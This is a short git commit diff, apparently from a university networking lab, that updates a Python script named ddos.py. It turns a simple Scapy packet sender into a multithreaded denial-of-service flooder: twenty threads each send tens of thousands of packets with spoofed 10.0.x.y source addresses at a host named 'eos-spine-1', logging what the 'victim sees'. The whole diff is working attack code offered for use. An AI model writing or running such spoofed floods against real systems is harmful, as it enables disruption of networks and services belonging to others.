b68060fd53376a59efe122286dc24e63a4881070
mark-wilmes <mawi0949@colorado.edu>
2017-10-14 14:28:50 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,7 +1,13 @@
 from scapy.all import *
+from threading import Thread
 
-for i in range(1,255):
-	packet = IP(dst="eos-spine-1",src="10.0.0." + str(i),ttl=25)
-	send(packet)
-	print("victim sees 10.0.0." + str(i))
+def sendPackets():
+	for i in range(1,255):
+		for j in range(1,255):
+			packet = IP(dst="eos-spine-1",src="10.0." + str(i) + "." + str(j),ttl=25)/TCP()/UDP()
+			send(packet)
+			print("victim sees 10.0." + str(i) + "." + str(j))
 
+for i in range(0,20):
+	thread = Thread(target=sendPackets,args=())
+	thread.start()
